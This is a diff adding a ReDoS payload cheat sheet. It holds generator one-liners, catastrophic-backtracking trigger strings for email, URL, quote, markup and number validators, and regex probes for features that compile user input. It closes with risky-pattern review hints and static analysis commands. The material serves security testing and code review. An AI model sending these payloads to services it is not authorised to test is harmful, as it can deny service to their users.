@@ -1,0 +1,89 @@
+# ReDoS Payloads
+# Input families. Increase the repetition count gradually and watch the response time; stop at the first clear slowdown.
+
+# Generation commands (replace N with 10, 20, 25, 30, 35)
+python3 -c "print('a'*N + '!')"
+python3 -c "print('a'*N + '@')"
+python3 -c "print('a'*N + 'b')"
+python3 -c "print('x'*N + '\n')"
+python3 -c "print('a@' + 'a.'*N + '!')"
+python3 -c "print('1'*N + 'x')"
+node -e "console.log('a'.repeat(N)+'!')"
+
+# Nested quantifier pattern (a+)+ , (a*)* , (a|aa)+ , (a|a?)+ : trigger string
+aaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# Overlapping alternation (a|a)* , (a|ab)* , (x+x+)+y : trigger string
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxz
+ababababababababababababababababc
+
+# Email validators with nested groups (for example ^([a-zA-Z0-9])(([\-.]|[_]+)?([a-zA-Z0-9]+))*(@){1}...)
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!@example.test
+a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a-a!
+a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a!
+test@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
+
+# URL validators with nested repeating groups
+http://aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.
+http://a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.a.!
+https://example.test/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+
+# Whitespace and line-ending patterns (\s*\n? , \s+$ after a failed suffix)
+                                                    x
+a                                                   x
+	a	a	a	a	a	a	a	a	a	a	a	a	a	a	a	a	a	a	a	!
+
+# Trailing whitespace trim vulnerability (^\s+|\s+$ in older libraries)
+x                                                                          .
+
+# Quote/escape patterns ("(\\.|[^"])*" with an unterminated quote)
+"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+"\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+
+# HTML/Markdown patterns (unclosed tags, nested emphasis, repeated brackets)
+<a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a <a
+[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[
+*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_
+<!--------------------------------------------------------------
+<script <script <script <script <script <script <script <script
+
+# Number / date / version patterns
+11111111111111111111111111111111111111111111x
+1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.1.x
+2021-01-01-01-01-01-01-01-01-01-01-01-01-01-01-01-01-01-x
+1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,x
+
+# Polynomial (quadratic) cases, such as .*.*= or \s*,\s* with many separators
+=================================================================
+,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
+                                                                    ,
+a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a,a
+
+# User-supplied regex probes (search or filter features that compile input as a pattern; use short inputs and a timeout)
+(a+)+$
+(a*)*$
+(a|aa)+$
+(a|a?)+$
+(.*a){20}
+^(([a-z])+.)+[A-Z]([a-z])+$
+^(a+)+$
+(x+x+)+y
+(\w+\s?)*$
+
+# Regex features that increase risk (look for these in source review)
+# nested quantifiers: (a+)+  (a*)*  (a+)*  (a{1,})+
+# alternation with overlap: (a|aa)+  (a|a?)+  (.|\s)*
+# adjacent unbounded repeats: \d+\d+  .*.*  \s*\s*
+# backreferences with a quantified group
+# no anchors combined with a leading .*
+
+# Static analysis commands
+npx recheck "<regex>"
+npx safe-regex "<regex>"
+python3 -c "import re;print(re.compile(r'<regex>'))"
+semgrep --config p/redos .
